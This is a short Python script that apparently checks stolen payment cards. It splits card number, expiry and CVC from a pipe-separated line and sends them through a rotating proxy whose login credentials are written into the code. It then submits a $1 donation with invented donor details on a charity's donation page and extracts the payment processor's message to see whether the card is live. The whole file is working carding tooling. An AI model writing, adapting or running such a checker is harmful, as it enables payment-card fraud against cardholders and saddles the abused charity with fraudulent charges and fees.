import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'emahot.org',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarykFWXRVtk53tU6UaI',
	    'origin': 'https://emahot.org',
	    'referer': 'https://emahot.org/donate.html',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	files = {
	    'firstNameField': (None, 'Gen'),
	    'lastNameField': (None, 'Paypal'),
	    'emailField': (None, f'genpaypal{random_amount1}{random_amount2}@gmail.com'),
	    'donationAmount': (None, '1'),
	    'recurring': (None, 'false'),
	    'phoneField': (None, ''),
	    'cardNumber': (None, f'{n}'),
	    'cardExpiration': (None, f'{mm}/{yy}'),
	    'cardCode': (None, f'{cvc}'),
	    'cardZipcode': (None, ''),
	}
	
	response = session.post('https://emahot.org/process-payment.php', headers=headers, files=files)
	
	result = re.search(r'"message": "(.*?)"', response.text).group(1)
		
	return (result)
